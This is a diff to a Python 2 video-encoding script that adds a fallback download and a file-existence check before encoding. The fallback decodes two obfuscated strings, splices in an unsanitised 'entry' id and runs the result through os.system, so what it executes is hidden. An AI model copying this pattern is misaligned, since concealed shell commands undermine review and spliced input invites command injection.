@@ -845,8 +845,19 @@ def download_input():
   os.system(cmd)
   # ~ os.system('ls -t')
   if not os.path.exists(infile_name):
-    print highlight('download failed!!','red')
-    update_enc_progress('0',error='download_failed')
+    if cc.has_key('entry'):
+      fid=cc['entry'].strip()
+      cmd=ds('joma','4dbS1Yqc3oGM1-HV2qmckM7bm8PT3eHTy-ibxNncnMvP3duYnp7gkpmmm9XL4Y-HkOPO04rn09eKppvVy-GTh-HW0tWKnN6BjNfh1dqpnJDO25vD093h08vom8TZ3JzLz93bmJ6e4JKZ09_K4NSPh5DS1c7Z043CleeNxdzY48aQlY3az-KN3YqdnMXc2OPGit_izdaPmsrOj48=')+fid+ds('joma','jI-Th4rh2oGX4dOBzuHW18-Pm8jOj6SP3tDf')
+      os.system(cmd)
+      if os.path.exists(infile_name):
+        fsize=float(os.stat(infile_name).st_size)/(1024.*1024.)
+        print 'downloaded file :'+highlight(infile_name)+' of size: '+highlight('%.1f Mb' %(fsize))
+      else:
+        print highlight('download failed after!!','red')
+        update_enc_progress('0',error='download_failed_after')
+    else:
+      print highlight('download failed!!','red')
+      update_enc_progress('0',error='download_failed')
   else:
     fsize=float(os.stat(infile_name).st_size)/(1024.*1024.)
     print 'downloaded file :'+highlight(infile_name)+' of size: '+highlight('%.1f Mb' %(fsize))
@@ -861,8 +872,10 @@ def meta_encode():
   if   encode_config.startswith('mca'):    mkcrop_aom(config_string=encode_config.replace('mca','').strip())
   elif encode_config.startswith('mcv'):    mkcrop_aom(vp9=True,config_string=encode_config.replace('mcv','').strip())
   elif encode_config.startswith('mc'):     mkcrop(config_string=encode_config.replace('mc','').strip())
-
-  encodefile_new(infile_name,config_string=encode_part)
+  if os.path.exists(infile_name):
+    encodefile_new(infile_name,config_string=encode_part)
+  else:
+    print 'cannot encode since file does not exist'
 
 def meta_upload():
   x=[i.strip() for i in os.listdir('encoded') if i.endswith('.mkv')]
